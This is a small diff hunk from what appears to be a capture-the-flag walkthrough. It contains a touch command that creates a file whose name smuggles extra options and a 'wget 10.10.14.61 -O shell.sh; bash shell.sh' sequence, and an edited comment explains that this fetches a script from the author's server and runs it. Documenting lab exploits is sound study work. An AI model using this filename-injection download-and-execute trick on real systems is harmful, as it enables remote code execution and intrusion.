@@ -197,7 +197,7 @@ Ill first make the shell
 touch -- "-TT wget 10.10.14.61 -O shell.sh; bash shell.sh"
 ```
 
-Then ill remake the second file, this will get index.html by default
+Then ill remake the second file, this will get index.html by default from my web server and save it in shell.sh
 
 
 
